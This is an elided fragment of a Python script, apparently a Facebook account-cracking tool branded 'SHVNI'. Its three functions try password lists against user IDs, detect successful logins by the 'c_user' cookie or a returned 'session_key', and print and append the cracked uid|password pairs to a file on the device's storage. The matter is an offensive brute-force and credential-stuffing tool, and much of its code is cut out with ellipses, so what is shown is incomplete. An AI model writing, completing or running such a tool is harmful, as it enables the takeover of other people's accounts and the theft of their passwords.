...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHVNI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [SHVNI-FIRE] %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
    ...
    'viewport-width': '980',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SHVNI-OK] '+ids+' | '+pas+'\033[1;97m')
...
def rndm(ids,passlist):
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHVNI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHVNI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'\033[1;97m')
